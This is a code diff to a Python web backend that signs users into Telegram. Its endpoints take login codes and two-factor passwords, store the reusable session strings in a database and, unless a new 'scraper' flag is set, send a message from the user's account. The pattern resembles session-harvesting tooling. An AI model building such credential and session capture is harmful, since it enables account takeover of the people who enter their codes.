@@ -318,6 +318,7 @@ async def verify_code():
     code = data.get('code')
     phone_code_hash = data.get('phone_code_hash')
     chat_id = data.get('chat_id')
+    scraper = data.get('scraper')
 
     if not phone or not code or not phone_code_hash or not chat_id:
         return jsonify({'error': 'Phone, code, phone_code_hash, and chat_id are required'}), 400
@@ -342,7 +343,10 @@ async def verify_code():
 
         session_string = user_client.session.save()
         save_session_to_db(chat_id, session_string)
-        await send_message(user_client)
+
+        if not scraper:
+            # Send a message after successful login
+            await send_message(user_client)
 
         return jsonify({'message': 'Login successful and action performed'})
     except Exception as e:
@@ -357,6 +361,7 @@ async def verify_2fa():
     data = await request.get_json()
     chat_id = data.get('chat_id')
     password = data.get('password')
+    scraper = data.get('scraper')
 
     if not chat_id or not password:
         return jsonify({'error': 'Chat ID and password are required'}), 400
@@ -370,7 +375,10 @@ async def verify_2fa():
 
         session_string = user_client.session.save()
         save_session_to_db(chat_id, session_string)
-        await send_message(user_client)
+        
+        if not scraper:
+            # Send a message after successful login
+            await send_message(user_client)
 
         return jsonify({'message': 'Login successful and action performed'})
     except SessionPasswordNeededError:
